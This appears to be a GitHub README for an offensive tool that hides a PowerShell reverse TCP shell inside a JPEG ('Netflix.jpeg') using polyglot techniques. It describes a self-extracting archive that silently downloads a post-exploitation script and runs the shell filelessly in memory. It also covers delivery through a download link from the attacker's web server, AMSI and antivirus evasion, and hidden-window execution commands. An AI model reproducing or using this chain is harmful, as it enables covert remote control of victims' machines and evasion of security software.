## :octocat: JPEG PolyGlot RCE ( OpenSSL ) 

<br />

Author: @mindcrypt ( powerglot ) | @r00t-3xp10it<br />
Tested Under: Windows 10 ( 19042 ) x64 bits<br />
Required Dependencies: <b><i>python3</i></b> {attacker}, <b><i>powerglot.py  {attacker}</i></b>, <b><i>WinRar (wine)</i></b><br />
Optional Dependencies: None<br />
powerglot GitHub: https://github.com/r00t-3xp10it/powerglot<br />

<br />

## :octocat: powerglot - Agent Description
Powerglot is a multifunctional and multi-platform attack and defense tool based on polyglots. Powerglot allows to mask a script (powershell, shellscripting, php, ...) mainly in a digital image, although other file formats are in progress. Unlike the usual offensive tools or malware, Powerglot does not need any loader to execute the "information hidden", minimizing the noise on the target system.

![oki](https://user-images.githubusercontent.com/23490060/122489496-be25d200-cfd7-11eb-8932-9780d7f62ab5.jpg)

<br />

## :octocat: Venom- Agent nº8 Description
Venom amsi evasion agent nº8 asks attacker to input a legit <b><i>Image.jpeg</I></b> to be embbebed with venom reverse tcp PS shell ( Client.ps1 ) then it compresses the image.jpeg into a sfx archive and add a cmdline to sfx archive that silent downloads <b><i>redpill.ps1</i></b> post-exploitation auxiliary into target system <b><i>%tmp%</i></b> directory and silent download\execute <b><i>Client.ps1</i></b> in target system RAM ( FileLess ) in a background process.<br />

The agent its deliver by store the sfx archive on attacker <b><i>apache2</i></b> webroot and present one URL link for download, when target user de-compresses the sfx archive the Image.jpeg will by expanded in <b><i>current directory</i></b> while redpill.ps1 its silent uploaded to <b><i>%tmp%</i></b> directory<br />and image.jpeg metadata ( Client.ps1 ) its executed giving us one reverse tcp shel prompt back on attacker machine.<br />

![diagram](https://user-images.githubusercontent.com/23490060/122494019-938c4700-cfe0-11eb-8726-31548efb19aa.png)

<br />

## :octocat: Venom- Agent nº8 Execution
```powershell ( manual execution )
cat Netflix.jpeg|powershell
```

Sfx archive agent execution ( auto-execution )
```powershell
powershell -WindowStyle Hidden cat Netflix.jpeg|powershell
```

<br />

## :octocat: AntiScan.Me | Online Virus Scanner Without Result Distribution
![aintisacnme](https://user-images.githubusercontent.com/23490060/122630539-5e552700-d0bc-11eb-8fc5-8e9b9351411d.png)
antiscan.me file report: https://antiscan.me/scan/new/result?id=uwzOO01KkQ5k
